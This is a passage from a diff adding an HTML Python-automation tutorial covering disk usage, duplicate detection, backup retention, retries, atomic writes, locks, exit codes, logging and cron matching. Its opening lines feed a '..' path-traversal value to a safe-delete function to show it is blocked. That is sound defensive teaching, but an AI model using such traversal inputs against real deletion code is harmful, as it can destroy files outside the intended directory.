+    safe_delete(root / <span class="st">'..'</span> / outside.parent.name / <span class="st">'precious.db'</span>, root)
+<span class="kw">except</span> ValueError <span class="kw">as</span> e:
+    <span class="bi">print</span>(<span class="st">'blocked:'</span>, e)
+<span class="bi">print</span>(<span class="st">'precious.db survived:'</span>, outside.exists())</div>
+  </div>
+  <div class="info-box danger"><div class="ib-icon">🚫</div><div class="ib-body"><strong>Resolve first, then compare.</strong> Checking <code>str(target).startswith(str(root))</code> on the raw path is a classic bug: <code>/data/backups-old</code> starts with <code>/data/backups</code>, and <code>/data/backups/../secrets</code> passes the string test but points elsewhere. <code>Path.resolve()</code> followed by <code>is_relative_to()</code> compares real locations, and the extra <code>target == root</code> check stops someone deleting the root itself.</div></div>
+
+  <!-- 3.2 -->
+  <div class="lesson-h2">3.2 — A Disk-Usage Report (the du -sh You Can Test)</div>
+  <p class="lesson-p">"The disk is 94% full — what's eating it?" is a daily question, and <code>du -sh * | sort -h</code> answers it in a shell. Writing the same thing in Python is worth it the moment you need to run it on a schedule, alert on a threshold, or post the result to a chat channel. The recipe is always the same: walk the tree with <code>rglob('*')</code>, keep only files (<code>is_file()</code>), attribute each file's <code>st_size</code> to a bucket (here, the top-level directory), then sort. Keep the byte-counting separate from the formatting: a function that returns numbers is testable, one that prints strings is not.</p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">Usage per top-level directory, largest first</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">import</span> os, tempfile
+<span class="kw">from</span> pathlib <span class="kw">import</span> Path
+
+<span class="kw">def</span> <span class="fn">make_tree</span>(root, spec):
+    <span class="st">"""spec maps 'relative/path' -&gt; (content_bytes, epoch_mtime)."""</span>
+    <span class="kw">for</span> rel, (data, mtime) <span class="kw">in</span> spec.items():
+        p = root / rel
+        p.parent.mkdir(parents=<span class="kw">True</span>, exist_ok=<span class="kw">True</span>)   <span class="cm"># exist_ok =&gt; safe to re-run</span>
+        p.write_bytes(data)
+        os.utime(p, (mtime, mtime))                   <span class="cm"># pin mtime so output is deterministic</span>
+
+<span class="kw">def</span> <span class="fn">human</span>(n):
+    <span class="kw">for</span> unit <span class="kw">in</span> (<span class="st">'B'</span>, <span class="st">'KB'</span>, <span class="st">'MB'</span>, <span class="st">'GB'</span>):
+        <span class="kw">if</span> n &lt; <span class="nm">1024</span> <span class="kw">or</span> unit == <span class="st">'GB'</span>:
+            <span class="kw">return</span> <span class="st">f'{n} B'</span> <span class="kw">if</span> unit == <span class="st">'B'</span> <span class="kw">else</span> <span class="st">f'{n:.1f} {unit}'</span>
+        n /= <span class="nm">1024</span>
+
+<span class="kw">def</span> <span class="fn">usage_by_top_dir</span>(root):
+    totals = {}
+    <span class="kw">for</span> p <span class="kw">in</span> root.rglob(<span class="st">'*'</span>):
+        <span class="kw">if</span> p.is_file():
+            top = p.relative_to(root).parts[<span class="nm">0</span>]
+            totals[top] = totals.get(top, <span class="nm">0</span>) + p.stat().st_size
+    <span class="kw">return</span> totals
+
+root = Path(tempfile.mkdtemp())
+make_tree(root, {
+    <span class="st">'var/log/syslog'</span>:      (<span class="st">b'a'</span> * <span class="nm">1_800_000</span>, <span class="nm">0</span>),
+    <span class="st">'var/log/auth.log'</span>:    (<span class="st">b'a'</span> * <span class="nm">240_000</span>, <span class="nm">0</span>),
+    <span class="st">'var/cache/pkg.tar'</span>:   (<span class="st">b'b'</span> * <span class="nm">5_200_000</span>, <span class="nm">0</span>),
+    <span class="st">'home/deploy/.bashrc'</span>: (<span class="st">b'c'</span> * <span class="nm">3_800</span>, <span class="nm">0</span>),
+    <span class="st">'tmp/scratch.dat'</span>:     (<span class="st">b'd'</span> * <span class="nm">640</span>, <span class="nm">0</span>),
+})
+usage = usage_by_top_dir(root)
+<span class="kw">for</span> name, size <span class="kw">in</span> <span class="bi">sorted</span>(usage.items(), key=<span class="kw">lambda</span> kv: kv[<span class="nm">1</span>], reverse=<span class="kw">True</span>):
+    <span class="bi">print</span>(<span class="st">f'{name:&lt;6}{human(size):&gt;10}'</span>)
+<span class="bi">print</span>(<span class="st">f'{"TOTAL":&lt;6}{human(sum(usage.values())):&gt;10}'</span>)</div>
+  </div>
+  <div class="info-box note"><div class="ib-icon">💡</div><div class="ib-body"><strong>Size on disk ≠ file size.</strong> <code>st_size</code> is the logical length. Filesystems allocate whole blocks, sparse files report a large logical size but use little space, and hard links make the same data appear under two names. <code>du</code> reports blocks actually used (<code>st_blocks * 512</code>). For a "why is the disk full" report that must match <code>df</code>, use <code>st_blocks</code>; for "how big is this backup," <code>st_size</code> is right. Also remember that a deleted file still held open by a process keeps consuming space until the process exits — a classic cause of "df says full, du says empty."</div></div>
+
+  <!-- 3.3 -->
+  <div class="lesson-h2">3.3 — Finding Duplicate Files by Content</div>
+  <p class="lesson-p">Duplicate detection is a good example of writing automation that scales. The naive version hashes every file — fine for 100 files, painful for 5 million or for a 200&nbsp;GB tree. The trick is that a hash is only needed to <em>distinguish files that could be equal</em>, and two files can only be equal if they are the same size. So: group by size first (a cheap <code>stat</code>), skip every size that appears once, and hash only the survivors. Hash in fixed-size chunks so memory stays flat no matter how large the file is — <code>path.read_bytes()</code> on a 50&nbsp;GB file is an out-of-memory kill waiting to happen.</p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">Group by size, then hash only the candidates</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">import</span> hashlib, os, tempfile
+<span class="kw">from</span> pathlib <span class="kw">import</span> Path
+
+<span class="kw">def</span> <span class="fn">make_tree</span>(root, spec):
+    <span class="st">"""spec maps 'relative/path' -&gt; (content_bytes, epoch_mtime)."""</span>
+    <span class="kw">for</span> rel, (data, mtime) <span class="kw">in</span> spec.items():
+        p = root / rel
+        p.parent.mkdir(parents=<span class="kw">True</span>, exist_ok=<span class="kw">True</span>)   <span class="cm"># exist_ok =&gt; safe to re-run</span>
+        p.write_bytes(data)
+        os.utime(p, (mtime, mtime))                   <span class="cm"># pin mtime so output is deterministic</span>
+
+<span class="kw">def</span> <span class="fn">sha256_of</span>(path, chunk_size=<span class="nm">65536</span>):
+    h = hashlib.sha256()
+    <span class="kw">with</span> <span class="bi">open</span>(path, <span class="st">'rb'</span>) <span class="kw">as</span> f:
+        <span class="kw">while</span> chunk := f.read(chunk_size):     <span class="cm"># constant memory, even for a 50 GB file</span>
+            h.update(chunk)
+    <span class="kw">return</span> h.hexdigest()
+
+<span class="kw">def</span> <span class="fn">find_duplicates</span>(root):
+    by_size = {}
+    <span class="kw">for</span> p <span class="kw">in</span> root.rglob(<span class="st">'*'</span>):
+        <span class="kw">if</span> p.is_file():
+            by_size.setdefault(p.stat().st_size, []).append(p)
+    hashed, groups = <span class="nm">0</span>, {}
+    <span class="kw">for</span> size, paths <span class="kw">in</span> by_size.items():
+        <span class="kw">if</span> <span class="bi">len</span>(paths) &lt; <span class="nm">2</span>:
+            <span class="kw">continue</span>                            <span class="cm"># a unique size cannot have a duplicate: skip the hash</span>
+        <span class="kw">for</span> p <span class="kw">in</span> paths:
+            hashed += <span class="nm">1</span>
+            groups.setdefault(sha256_of(p), []).append(p.relative_to(root).as_posix())
+    dupes = <span class="bi">sorted</span>(<span class="bi">sorted</span>(g) <span class="kw">for</span> g <span class="kw">in</span> groups.values() <span class="kw">if</span> <span class="bi">len</span>(g) &gt; <span class="nm">1</span>)
+    <span class="kw">return</span> dupes, hashed
+
+root = Path(tempfile.mkdtemp())
+make_tree(root, {
+    <span class="st">'releases/app-1.0.tgz'</span>: (<span class="st">b'BINARY-A'</span> * <span class="nm">500</span>, <span class="nm">0</span>),
+    <span class="st">'backup/app-1.0.tgz'</span>:   (<span class="st">b'BINARY-A'</span> * <span class="nm">500</span>, <span class="nm">0</span>),
+    <span class="st">'releases/app-1.1.tgz'</span>: (<span class="st">b'BINARY-B'</span> * <span class="nm">500</span>, <span class="nm">0</span>),    <span class="cm"># same size, different content</span>
+    <span class="st">'notes/todo.txt'</span>:       (<span class="st">b'rotate certs'</span>, <span class="nm">0</span>),      <span class="cm"># unique size: never hashed</span>
+})
+dupes, hashed = find_duplicates(root)
+<span class="bi">print</span>(<span class="st">'duplicate groups:'</span>, dupes)
+<span class="bi">print</span>(<span class="st">'files hashed:'</span>, hashed, <span class="st">'of 4'</span>)</div>
+  </div>
+  <div class="info-box tip"><div class="ib-icon">⭐</div><div class="ib-body"><strong>Read the output for what it teaches:</strong> three of four files were hashed, not four — <code>todo.txt</code> had a unique size and never touched the disk again. The two <code>app-1.x.tgz</code> releases had identical sizes but different content, and the hash correctly kept them apart, which is why "same size" is never enough on its own. For adversarial or compliance-grade comparisons use SHA-256 (as here); for a quick internal dedupe MD5 or a fast non-cryptographic hash is fine — just don't call it "verification."</div></div>
+
+  <!-- 3.4 -->
+  <div class="lesson-h2">3.4 — Retention and Rotation Policies With an Injected Clock</div>
+  <p class="lesson-p">Every system that produces files (logs, backups, build artifacts, snapshots) eventually needs a rule for deleting them, and that rule is the most dangerous code in the whole script. Three design decisions keep it safe. <strong>One:</strong> compute a <em>plan</em> (what to keep, what to delete) as a pure function, and only then act on it — that makes a dry-run trivial. <strong>Two:</strong> never call <code>datetime.now()</code> inside the logic; pass <code>now</code> in. The function becomes deterministic, unit-testable at any date, and you can replay "what would have been deleted last Tuesday." <strong>Three:</strong> combine an age rule with a count rule — keep anything newer than N days <em>or</em> among the newest K. The count rule is the seatbelt.</p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">A pure retention planner (age OR newest-K)</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">import</span> re
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime, timedelta, timezone
+
+NOW = datetime(<span class="nm">2025</span>, <span class="nm">3</span>, <span class="nm">15</span>, <span class="nm">12</span>, <span class="nm">0</span>, tzinfo=timezone.utc)   <span class="cm"># injected clock: never call now() inside the logic</span>
+
+<span class="kw">def</span> <span class="fn">backup_date</span>(name):
+    m = re.search(<span class="st">r'(\d{4}-\d{2}-\d{2})'</span>, name)
+    <span class="kw">return</span> datetime.strptime(m.group(<span class="nm">1</span>), <span class="st">'%Y-%m-%d'</span>).replace(tzinfo=timezone.utc)
+
+<span class="kw">def</span> <span class="fn">plan_retention</span>(names, now, keep_days, keep_last):
+    newest_first = <span class="bi">sorted</span>(names, key=backup_date, reverse=<span class="kw">True</span>)
+    cutoff = now - timedelta(days=keep_days)
+    keep, delete = [], []
+    <span class="kw">for</span> i, name <span class="kw">in</span> <span class="bi">enumerate</span>(newest_first):
+        <span class="kw">if</span> i &lt; keep_last <span class="kw">or</span> backup_date(name) &gt;= cutoff:
+            keep.append(name)
+        <span class="kw">else</span>:
+            delete.append(name)
+    <span class="kw">return</span> keep, delete
+
+names = [<span class="st">'db-2025-03-14.sql.gz'</span>, <span class="st">'db-2025-03-13.sql.gz'</span>, <span class="st">'db-2025-03-12.sql.gz'</span>,
+         <span class="st">'db-2025-03-05.sql.gz'</span>, <span class="st">'db-2025-02-20.sql.gz'</span>, <span class="st">'db-2025-01-01.sql.gz'</span>]
+keep, delete = plan_retention(names, NOW, keep_days=<span class="nm">7</span>, keep_last=<span class="nm">2</span>)
+<span class="bi">print</span>(<span class="st">'keep  :'</span>, keep)
+<span class="bi">print</span>(<span class="st">'delete:'</span>, delete)
+
+stalled = [<span class="st">'db-2025-01-01.sql.gz'</span>, <span class="st">'db-2024-12-31.sql.gz'</span>, <span class="st">'db-2024-12-30.sql.gz'</span>]   <span class="cm"># backup job broke in January</span>
+keep, delete = plan_retention(stalled, NOW, keep_days=<span class="nm">7</span>, keep_last=<span class="nm">2</span>)
+<span class="bi">print</span>(<span class="st">'stalled job still keeps:'</span>, keep)</div>
+  </div>
+  <div class="info-box warn"><div class="ib-icon">⚠️</div><div class="ib-body"><strong>Why "newest K" matters.</strong> Look at the second call: the backup job broke in January, so by March <em>every</em> backup is older than 7 days. A pure age rule would delete them all — and you would discover the outage only when you needed a restore. Keeping the newest K regardless of age turns "silently deleted our last good backup" into "kept two stale ones, and monitoring should already be screaming that the newest is 2 months old."</div></div>
+
+  <!-- 3.5 -->
+  <div class="lesson-h2">3.5 — Retries With Exponential Backoff and Jitter</div>
+  <p class="lesson-p">Networks and APIs fail transiently: a connection reset, a 503 during a deploy, a rate-limit response. A retry turns most of those into non-events — but a naive retry (<code>while True: try again immediately</code>) is one of the most reliable ways to turn a small outage into a big one. The standard recipe has four parts. <strong>Bounded attempts</strong> (a budget, not infinity). <strong>Exponential backoff</strong>: wait 1s, 2s, 4s, 8s… so a struggling service gets breathing room, capped at a <code>max_delay</code>. <strong>Jitter</strong>: randomize each wait so a thousand clients that failed together don't all retry together (the <em>thundering herd</em>). And <strong>selectivity</strong>: retry only errors that can plausibly succeed next time (<code>ConnectionError</code>, <code>TimeoutError</code>, HTTP 429/502/503/504) — never a <code>ValueError</code> or a 400/404, because a malformed request stays malformed.</p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">A retry decorator with injected sleep and jitter</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">import</span> functools, time
+
+<span class="kw">def</span> <span class="fn">retry</span>(max_attempts=<span class="nm">4</span>, base_delay=<span class="nm">1.0</span>, factor=<span class="nm">2.0</span>, max_delay=<span class="nm">30.0</span>,
+          jitter=<span class="kw">lambda</span> cap: cap, sleep=<span class="kw">None</span>, retry_on=(ConnectionError, TimeoutError)):
+    sleep = sleep <span class="kw">or</span> time.sleep
+    <span class="kw">def</span> <span class="fn">decorator</span>(fn):
+        @functools.wraps(fn)
+        <span class="kw">def</span> <span class="fn">wrapper</span>(*args, **kwargs):
+            <span class="kw">for</span> attempt <span class="kw">in</span> <span class="bi">range</span>(max_attempts):
+                <span class="kw">try</span>:
+                    <span class="kw">return</span> fn(*args, **kwargs)
+                <span class="kw">except</span> retry_on:
+                    <span class="kw">if</span> attempt == max_attempts - <span class="nm">1</span>:
+                        <span class="kw">raise</span>                                    <span class="cm"># budget spent: surface the real error</span>
+                    cap = <span class="bi">min</span>(max_delay, base_delay * factor ** attempt)
+                    sleep(jitter(cap))
+        <span class="kw">return</span> wrapper
+    <span class="kw">return</span> decorator
+
+delays, calls = [], {<span class="st">'n'</span>: <span class="nm">0</span>}
+
+@retry(max_attempts=<span class="nm">4</span>, base_delay=<span class="nm">1.0</span>, jitter=<span class="kw">lambda</span> cap: cap / <span class="nm">2</span>, sleep=delays.append)
+<span class="kw">def</span> <span class="fn">flaky</span>():
+    calls[<span class="st">'n'</span>] += <span class="nm">1</span>
+    <span class="kw">if</span> calls[<span class="st">'n'</span>] &lt; <span class="nm">3</span>:
+        <span class="kw">raise</span> ConnectionError(<span class="st">'connection reset by peer'</span>)
+    <span class="kw">return</span> <span class="st">'ok'</span>
+
+<span class="bi">print</span>(flaky(), <span class="st">'after'</span>, calls[<span class="st">'n'</span>], <span class="st">'calls; slept'</span>, delays)
+
+@retry(sleep=delays.append)
+<span class="kw">def</span> <span class="fn">bad_input</span>():
+    <span class="kw">raise</span> ValueError(<span class="st">'malformed payload'</span>)      <span class="cm"># a bug in the request will not fix itself: no retry</span>
+
+<span class="kw">try</span>:
+    bad_input()
+<span class="kw">except</span> ValueError <span class="kw">as</span> e:
+    <span class="bi">print</span>(<span class="st">'not retried:'</span>, e)</div>
+  </div>
+  <p class="lesson-p">Notice the two injection points, <code>sleep</code> and <code>jitter</code>. In production they default to <code>time.sleep</code> and a random function; in a test you pass <code>delays.append</code> and a fixed function, so the test runs instantly and asserts the exact schedule. Code that hard-wires <code>time.sleep(random.uniform(...))</code> can only be tested by waiting. The common production jitter is <em>full jitter</em>: <code>random.uniform(0, cap)</code> — sleep anywhere from zero to the backoff cap — which spreads retries most evenly.</p>
+  <div class="info-box danger"><div class="ib-icon">🚫</div><div class="ib-body"><strong>Only retry what is safe to repeat.</strong> If the request might have succeeded before the connection dropped, retrying a non-idempotent call (<code>POST /charge</code>, "send email", "increment counter") can double-apply it. Either retry only idempotent operations (GET, PUT, DELETE by id), or attach an <strong>idempotency key</strong> so the server can recognize a repeat. Also set a per-attempt <em>timeout</em>: a retry loop around a call that can hang forever never gets to retry.</div></div>
+
+  <!-- 3.6 -->
+  <div class="lesson-h2">3.6 — Idempotency, Atomic Writes and Locks</div>
+  <p class="lesson-p">A script is <strong>idempotent</strong> if running it twice leaves the system in the same state as running it once. It is the property that makes automation safe to re-run after a crash, safe to schedule aggressively, and safe for a nervous human to run "just to be sure." You get it by describing the <em>desired end state</em> rather than the action: <em>"ensure this line is in the file"</em>, not <em>"append this line"</em>; <em>"ensure the directory exists"</em>, not <em>"create the directory."</em> The second half of the safety story is <strong>atomic writes</strong>: if a script crashes halfway through writing a config file, or a reader opens it mid-write, they see a truncated file. Write the new content to a temp file in the <em>same directory</em>, then <code>os.replace()</code> it into place — a single atomic rename, so readers see either the complete old file or the complete new one.</p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">ensure_line: idempotent and atomic</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">import</span> os, tempfile
+<span class="kw">from</span> pathlib <span class="kw">import</span> Path
+
+<span class="kw">def</span> <span class="fn">atomic_write</span>(path, text):
+    path = Path(path)
+    tmp = path.with_name(path.name + <span class="st">'.tmp'</span>)
+    tmp.write_text(text)
+    os.replace(tmp, path)        <span class="cm"># atomic on one filesystem: readers see the old file or the new one, never half</span>
+
+<span class="kw">def</span> <span class="fn">ensure_line</span>(path, line):
+    path = Path(path)
+    lines = path.read_text().splitlines() <span class="kw">if</span> path.exists() <span class="kw">else</span> []
+    <span class="kw">if</span> line <span class="kw">in</span> lines:
+        <span class="kw">return</span> <span class="kw">False</span>             <span class="cm"># already correct -&gt; do nothing (idempotent)</span>
+    atomic_write(path, <span class="st">'\n'</span>.join(lines + [line]) + <span class="st">'\n'</span>)
+    <span class="kw">return</span> <span class="kw">True</span>
+
+d = Path(tempfile.mkdtemp())
+hosts = d / <span class="st">'hosts.txt'</span>
+<span class="bi">print</span>(ensure_line(hosts, <span class="st">'10.0.0.5 db01'</span>))    <span class="cm"># True  -&gt; changed something</span>
+<span class="bi">print</span>(ensure_line(hosts, <span class="st">'10.0.0.5 db01'</span>))    <span class="cm"># False -&gt; second run is a no-op</span>
+<span class="bi">print</span>(ensure_line(hosts, <span class="st">'10.0.0.6 db02'</span>))
+<span class="bi">print</span>(hosts.read_text(), end=<span class="st">''</span>)
+<span class="bi">print</span>(<span class="bi">sorted</span>(p.name <span class="kw">for</span> p <span class="kw">in</span> d.iterdir()))    <span class="cm"># no leftover .tmp file</span></div>
+  </div>
+  <p class="lesson-p">The last piece is stopping two copies of the script running at once — cron fires while the previous run is still going, or two engineers run it together. A <strong>lock</strong> serializes them. The simplest portable lock is a file created with the exclusive-create flag: <code>open(path, 'x')</code> succeeds for exactly one caller and raises <code>FileExistsError</code> for everyone else. Wrap it in a context manager so it is <em>always</em> released, even when the body raises.</p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">A file lock as a context manager</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">import</span> tempfile
+<span class="kw">from</span> pathlib <span class="kw">import</span> Path
+
+<span class="kw">class</span> <span class="cls">LockHeld</span>(Exception):
+    <span class="kw">pass</span>
+
+<span class="kw">class</span> <span class="cls">FileLock</span>:
+    <span class="kw">def</span> <span class="fn">__init__</span>(self, path):
+        self.path = Path(path)
+    <span class="kw">def</span> <span class="fn">__enter__</span>(self):
+        <span class="kw">try</span>:
+            self.path.<span class="bi">open</span>(<span class="st">'x'</span>).close()          <span class="cm"># 'x' = create exclusively; fails if the file exists</span>
+        <span class="kw">except</span> FileExistsError:
+            <span class="kw">raise</span> LockHeld(<span class="st">f'{self.path.name} is held by another run'</span>) <span class="kw">from</span> <span class="kw">None</span>
+        <span class="kw">return</span> self
+    <span class="kw">def</span> <span class="fn">__exit__</span>(self, *exc):
+        self.path.unlink(missing_ok=<span class="kw">True</span>)        <span class="cm"># always release, even if the body raised</span>
+        <span class="kw">return</span> <span class="kw">False</span>
+
+d = Path(tempfile.mkdtemp())
+<span class="kw">with</span> FileLock(d / <span class="st">'janitor.lock'</span>):
+    <span class="kw">try</span>:
+        <span class="kw">with</span> FileLock(d / <span class="st">'janitor.lock'</span>):
+            <span class="bi">print</span>(<span class="st">'this must never print'</span>)
+    <span class="kw">except</span> LockHeld <span class="kw">as</span> e:
+        <span class="bi">print</span>(<span class="st">'second run refused:'</span>, e)
+<span class="bi">print</span>(<span class="st">'lock released:'</span>, <span class="kw">not</span> (d / <span class="st">'janitor.lock'</span>).exists())</div>
+  </div>
+  <div class="info-box warn"><div class="ib-icon">⚠️</div><div class="ib-body"><strong>Stale locks.</strong> A file lock survives a <code>kill -9</code> or a power loss, so the next run is locked out forever. Real tools store the owner PID (and check it is still alive), set a lock timeout, or use OS-level advisory locks (<code>fcntl.flock</code>) that the kernel releases automatically when the process dies. <code>os.replace()</code> is atomic only within one filesystem — that's why the temp file lives next to its destination, not in <code>/tmp</code>.</div></div>
+
+  <!-- 3.7 -->
+  <div class="lesson-h2">3.7 — Exit Codes, argparse Subcommands and Structured Logging</div>
+  <p class="lesson-p">When your script runs under cron, a CI job, a Kubernetes <code>Job</code> or a systemd unit, nobody reads its output — the scheduler looks at the <strong>exit code</strong>. Zero means success; anything else means failure, and the platform reacts (retry, alert, mark the pipeline red). So a script that prints "ERROR: backup failed" and then exits 0 has told a human but lied to the machine. The conventions: <code>0</code> success, <code>1</code> general failure, <code>2</code> usage error (which <code>argparse</code> uses for you), <code>128+N</code> "killed by signal N" (137 = SIGKILL, 143 = SIGTERM). The pattern that makes this testable is a <code>main(argv=None) -> int</code> function that <em>returns</em> the code, called as <code>sys.exit(main())</code> only at the very bottom. Tests call <code>main([...])</code> with an explicit argument list — no real command line needed.</p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">argparse subcommands with an explicit argv, and honest exit codes</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">import</span> argparse, contextlib, io
+
+<span class="kw">def</span> <span class="fn">build_parser</span>():
+    p = argparse.ArgumentParser(prog=<span class="st">'janitor'</span>)
+    sub = p.add_subparsers(dest=<span class="st">'command'</span>, required=<span class="kw">True</span>)
+    plan = sub.add_parser(<span class="st">'plan'</span>, help=<span class="st">'show what would be deleted'</span>)
+    plan.add_argument(<span class="st">'--dir'</span>, required=<span class="kw">True</span>)
+    plan.add_argument(<span class="st">'--keep-days'</span>, <span class="bi">type</span>=<span class="bi">int</span>, default=<span class="nm">7</span>)
+    plan.add_argument(<span class="st">'--keep-last'</span>, <span class="bi">type</span>=<span class="bi">int</span>, default=<span class="nm">3</span>)
+    run = sub.add_parser(<span class="st">'run'</span>, help=<span class="st">'actually delete'</span>)
+    run.add_argument(<span class="st">'--dir'</span>, required=<span class="kw">True</span>)
+    run.add_argument(<span class="st">'--yes'</span>, action=<span class="st">'store_true'</span>, help=<span class="st">'required to really delete'</span>)
+    <span class="kw">return</span> p
+
+<span class="kw">def</span> <span class="fn">main</span>(argv=<span class="kw">None</span>):
+    <span class="kw">try</span>:
+        args = build_parser().parse_args(argv)
+    <span class="kw">except</span> SystemExit <span class="kw">as</span> e:
+        <span class="kw">return</span> e.code                            <span class="cm"># argparse exits with 2 on bad usage</span>
+    <span class="bi">print</span>(<span class="st">'command ='</span>, args.command, <span class="st">'| dir ='</span>, args.dir)
+    <span class="kw">return</span> <span class="nm">0</span>
+
+<span class="bi">print</span>(<span class="st">'exit code:'</span>, main([<span class="st">'plan'</span>, <span class="st">'--dir'</span>, <span class="st">'/backups'</span>, <span class="st">'--keep-days'</span>, <span class="st">'14'</span>]))
+
+err = io.StringIO()
+<span class="kw">with</span> contextlib.redirect_stderr(err):
+    code = main([<span class="st">'run'</span>])                         <span class="cm"># forgot --dir</span>
+<span class="bi">print</span>(<span class="st">'exit code:'</span>, code)
+<span class="bi">print</span>(err.getvalue().strip().splitlines()[-<span class="nm">1</span>])
+<span class="cm"># In a real script the last line is:  sys.exit(main())</span></div>
+  </div>
+  <p class="lesson-p">Subcommands (<code>janitor plan</code> vs <code>janitor run --yes</code>) are how you keep the dangerous action behind a deliberate flag: the default command shows what <em>would</em> happen. Logging matters just as much in unattended scripts. Plain <code>print</code> lines are fine for a human; <strong>structured (JSON) logs</strong> let Loki, CloudWatch, Datadog or <code>jq</code> filter on fields — <code>level == "ERROR"</code>, <code>file == "db-2025-01-01.sql.gz"</code> — instead of regex-ing prose.</p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">JSON log lines with the logging module</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">import</span> json, logging, sys
+
+<span class="kw">class</span> <span class="cls">JsonFormatter</span>(logging.Formatter):
+    <span class="kw">def</span> <span class="fn">format</span>(self, record):
+        payload = {<span class="st">'level'</span>: record.levelname, <span class="st">'msg'</span>: record.getMessage()}
+        payload.update(<span class="bi">getattr</span>(record, <span class="st">'fields'</span>, {}))
+        <span class="kw">return</span> json.dumps(payload, sort_keys=<span class="kw">True</span>)
+
+log = logging.getLogger(<span class="st">'janitor'</span>)
+log.handlers.clear()                             <span class="cm"># re-running this cell must not duplicate output</span>
+handler = logging.StreamHandler(sys.stdout)
+handler.setFormatter(JsonFormatter())
+log.addHandler(handler)
+log.setLevel(logging.INFO)
+log.propagate = <span class="kw">False</span>
+
+log.info(<span class="st">'plan computed'</span>, extra={<span class="st">'fields'</span>: {<span class="st">'keep'</span>: <span class="nm">3</span>, <span class="st">'delete'</span>: <span class="nm">2</span>, <span class="st">'dry_run'</span>: <span class="kw">True</span>}})
+log.error(<span class="st">'delete failed'</span>, extra={<span class="st">'fields'</span>: {<span class="st">'file'</span>: <span class="st">'db-2025-01-01.sql.gz'</span>, <span class="st">'errno'</span>: <span class="nm">13</span>}})</div>
+  </div>
+  <div class="info-box tip"><div class="ib-icon">⭐</div><div class="ib-body"><strong>Log the decision and its inputs, never the secrets.</strong> "Deleted 5 files (keep_days=7, keep_last=2, dry_run=False)" is a log line you can debug from six months later. Tokens, passwords and connection strings should never reach a log — mask them before they get near the logger. In a real service add a timestamp field (the logging module's <code>record.created</code>) and a correlation/run ID so one execution's lines can be grouped.</div></div>
+
+  <!-- 3.8 -->
+  <div class="lesson-h2">3.8 — Cron Expressions: Knowing When Your Script Runs</div>
+  <p class="lesson-p">Most of the scripts in this chapter run from cron or something that copies its syntax (Kubernetes <code>CronJob</code>, GitHub Actions <code>schedule</code>, CloudWatch rules). Five fields — <code>minute hour day-of-month month day-of-week</code> — each accepting <code>*</code>, a number, a list (<code>1,15</code>), a range (<code>1-5</code>), and a step (<code>*/5</code>, <code>10-50/10</code>). Writing a matcher is the quickest way to actually understand the semantics, and it is a favorite interview exercise because it hides real gotchas: cron numbers Sunday as <code>0</code> (and also <code>7</code>) while Python's <code>weekday()</code> starts at Monday = 0, and — the famous one — when <em>both</em> day-of-month and day-of-week are restricted, cron fires when <em>either</em> matches, not both.</p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">A cron-expression matcher</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">from</span> datetime <span class="kw">import</span> datetime
+
+<span class="kw">def</span> <span class="fn">field_matches</span>(field, value, lo, hi):
+    <span class="kw">for</span> part <span class="kw">in</span> field.split(<span class="st">','</span>):
+        step, has_step = <span class="nm">1</span>, <span class="st">'/'</span> <span class="kw">in</span> part
+        <span class="kw">if</span> has_step:
+            part, step = part.split(<span class="st">'/'</span>)
+            step = <span class="bi">int</span>(step)
+        <span class="kw">if</span> part == <span class="st">'*'</span>:
+            start, end = lo, hi
+        <span class="kw">elif</span> <span class="st">'-'</span> <span class="kw">in</span> part:
+            start, end = <span class="bi">map</span>(<span class="bi">int</span>, part.split(<span class="st">'-'</span>))
+        <span class="kw">else</span>:
+            start = <span class="bi">int</span>(part)
+            end = hi <span class="kw">if</span> has_step <span class="kw">else</span> start        <span class="cm"># "5/20" means 5-hi every 20</span>
+        <span class="kw">if</span> start &lt;= value &lt;= end <span class="kw">and</span> (value - start) % step == <span class="nm">0</span>:
+            <span class="kw">return</span> <span class="kw">True</span>
+    <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="kw">def</span> <span class="fn">cron_matches</span>(expr, dt):
+    minute, hour, dom, month, dow = expr.split()
+    <span class="kw">if</span> <span class="kw">not</span> (field_matches(minute, dt.minute, <span class="nm">0</span>, <span class="nm">59</span>) <span class="kw">and</span> field_matches(hour, dt.hour, <span class="nm">0</span>, <span class="nm">23</span>)
+            <span class="kw">and</span> field_matches(month, dt.month, <span class="nm">1</span>, <span class="nm">12</span>)):
+        <span class="kw">return</span> <span class="kw">False</span>
+    cron_dow = (dt.weekday() + <span class="nm">1</span>) % <span class="nm">7</span>                     <span class="cm"># cron: Sunday = 0; Python: Monday = 0</span>
+    dom_ok = field_matches(dom, dt.day, <span class="nm">1</span>, <span class="nm">31</span>)
+    dow_ok = field_matches(dow, cron_dow, <span class="nm">0</span>, <span class="nm">7</span>) <span class="kw">or</span> (cron_dow == <span class="nm">0</span> <span class="kw">and</span> field_matches(dow, <span class="nm">7</span>, <span class="nm">0</span>, <span class="nm">7</span>))
+    <span class="kw">if</span> dom != <span class="st">'*'</span> <span class="kw">and</span> dow != <span class="st">'*'</span>:
